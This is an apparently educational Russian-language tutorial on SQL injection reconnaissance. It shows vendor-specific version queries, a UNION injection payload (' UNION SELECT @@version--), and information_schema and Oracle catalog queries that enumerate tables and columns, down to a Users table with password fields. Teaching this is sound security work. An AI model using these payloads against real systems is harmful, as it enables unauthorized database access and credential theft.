# Examining the database
## Examining the database in SQL injection attacks
Для использования уязвимостей SQL-инъекций часто необходимо получить информацию о базе данных
Это включает в себя:

- Тип и версия программного обеспечения базы данных
- Таблицы и столбцы, содержащиеся в базе данных

## Querying the database type and version
Потенциально определить тип и версию базы данных можно, внедрив запросы, специфичные для конкретного поставщика, чтобы проверить, работает ли один из них

Ниже приведены несколько запросов для определения версии базы данных для некоторых популярных типов баз данных:
Тип базы данных	Запрос:

- Microsoft, MySQL - ```SELECT @@version```
- Оракул - ```SELECT * FROM v$version```
- PostgreSQL - ```SELECT version()```

Например, можно использовать ```UNION``` атаку со следующими входными данными:

```' UNION SELECT @@version--```

В результате может быть получен следующий вывод. В этом случае вы можете убедиться, что используется база данных Microsoft SQL Server, и посмотреть её версию:
```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

## Listing the contents of the database
Большинство типов баз данных (за исключением Oracle) имеют набор представлений, называемых информационной схемой. Она предоставляет информацию о базе данных
Например, вы можете выполнить запрос ```information_schema.tables``` для получения списка таблиц в базе данных:
```SELECT * FROM information_schema.tables```

В результате получим такой результат:
```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```
Данный вывод указывает на наличие трех таблиц, называемых ```Products```, ```Users```, и ```Feedback```

Затем мы можем выполнить запрос ```information_schema.columns``` для получения списка столбцов в отдельных таблицах:

```SELECT * FROM information_schema.columns WHERE table_name = 'Users'```

В результате получим такой результат:
```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```
В этом выводе отображаются столбцы указанной таблицы и тип данных каждого столбца

## Listing the contents of an Oracle database
В Oracle вы можете найти ту же информацию следующим образом:

- Вы можете получить список таблиц, выполнив запрос ```all_tables```:
  ```SELECT * FROM all_tables```
- Вы можете получить список столбцов, выполнив запрос ```all_tab_columns```:
  ```SELECT * FROM all_tab_columns WHERE table_name = 'USERS'```
